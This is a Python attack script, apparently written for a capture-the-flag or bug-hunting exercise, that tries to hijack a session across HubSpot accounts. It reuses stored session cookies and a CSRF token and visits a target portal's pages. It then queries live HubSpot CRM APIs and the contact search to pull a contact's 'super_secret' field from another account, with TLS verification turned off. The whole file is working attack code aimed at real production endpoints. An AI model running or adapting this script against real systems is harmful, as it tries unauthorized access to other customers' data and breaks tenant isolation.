#!/usr/bin/env python3
"""
Try to hijack/switch portal session by visiting target portal pages
"""

import requests
import json
import os
import urllib3
import re
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')

csrf = re.search(r'hubspotapi-csrf=([^;]+)', SESSION_COOKIES).group(1) if 'hubspotapi-csrf=' in SESSION_COOKIES else ''

print("="*80)
print("Portal Session Hijacking Attempt")
print("="*80)

# Create a session object to persist cookies
session = requests.Session()

# Set initial cookies
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://app.hubspot.com/',
    'Upgrade-Insecure-Requests': '1',
}

# ============================================================================
# STEP 1: Visit target portal dashboard to establish session
# ============================================================================

print("\n[*] Step 1: Visiting target portal dashboard...")

portal_urls = [
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/objects/0-1/',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/1',
]

for url in portal_urls:
    try:
        print(f"\n  Visiting: {url}")
        r = session.get(url, headers=headers, verify=False, timeout=10, allow_redirects=True)

        print(f"  Status: {r.status_code}")
        print(f"  Final URL: {r.url[:100]}")

        # Check if we got new cookies
        new_cookies = session.cookies.get_dict()
        if len(new_cookies) > len(SESSION_COOKIES.split('; ')):
            print(f"  Got {len(new_cookies)} total cookies (was {len(SESSION_COOKIES.split('; '))})")
            print(f"  New cookies might grant portal access!")

    except Exception as e:
        print(f"  Error: {str(e)[:100]}")

# ============================================================================
# STEP 2: Try API call with updated session
# ============================================================================

print("\n[*] Step 2: Trying API calls with updated session...")

api_headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json',
    'Referer': f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/1',
    'Origin': 'https://app.hubspot.com',
    'X-HubSpot-CSRF-hubspotapi': csrf,
}

# Update headers with session cookies
cookies_str = '; '.join([f'{k}={v}' for k, v in session.cookies.get_dict().items()])
api_headers['Cookie'] = cookies_str

api_urls = [
    f'https://app.hubspot.com/api/crm-objects/v1/objects/0-1/1?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/api/contacts/v1/contact/vid/1?portalId={TARGET_PORTAL}',
]

for url in api_urls:
    try:
        r = session.get(url, headers=api_headers, verify=False, timeout=5)

        print(f"\n  {url.split('.com')[1][:80]}")
        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  *** SUCCESS! ***")
            try:
                data = r.json()
                print(json.dumps(data, indent=2)[:500])

                if 'super_secret' in json.dumps(data).lower():
                    print(f"\n  *** CTF FLAG FOUND! ***")
                    print(json.dumps(data, indent=2))

                    with open('/home/user/Hub/findings/SESSION_HIJACK_SUCCESS.json', 'w') as f:
                        json.dump(data, f, indent=2)

            except:
                print(f"  Response: {r.text[:300]}")

    except Exception as e:
        print(f"  Error: {str(e)[:100]}")

# ============================================================================
# STEP 3: Try search with session
# ============================================================================

print("\n[*] Step 3: Trying search with session...")

search_url = 'https://api.hubapi.com/crm/v3/objects/contacts/search'

# Use session's cookies in Authorization header
search_headers = api_headers.copy()

search_payload = {
    'filterGroups': [{
        'filters': [{
            'propertyName': 'hs_object_id',
            'operator': 'EQ',
            'value': '1'
        }]
    }],
    'properties': ['firstname', 'super_secret', 'email'],
    'limit': 10
}

try:
    # First, ensure we're "in" the target portal by visiting its page
    session.get(f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/1', headers=headers, verify=False)

    # Now try the search
    r = session.post(search_url, headers=api_headers, json=search_payload, verify=False, timeout=10)

    print(f"\nSearch status: {r.status_code}")

    if r.status_code == 200:
        data = r.json()
        print(json.dumps(data, indent=2))

        if data.get('results'):
            for result in data['results']:
                result_url = result.get('url', '')
                if TARGET_PORTAL in result_url:
                    print(f"\n*** GOT DATA FROM TARGET PORTAL! ***")

except Exception as e:
    print(f"Error: {e}")

print("\n" + "="*80)
print("Session Hijack Attempt Complete")
print("="*80)
